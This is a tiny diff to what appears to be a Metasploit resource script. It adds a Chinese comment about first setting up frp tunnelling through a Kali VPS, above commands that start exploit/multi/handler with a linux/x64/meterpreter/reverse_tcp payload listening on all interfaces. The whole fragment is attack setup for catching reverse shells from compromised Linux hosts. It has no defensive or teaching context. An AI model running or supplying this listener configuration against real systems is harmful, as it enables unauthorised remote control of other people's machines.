@@ -1,3 +1,4 @@
+# 先开启kali frp vps 穿透
 use exploit/multi/handler 
 set payload linux/x64/meterpreter/reverse_tcp
 set lhost 0.0.0.0
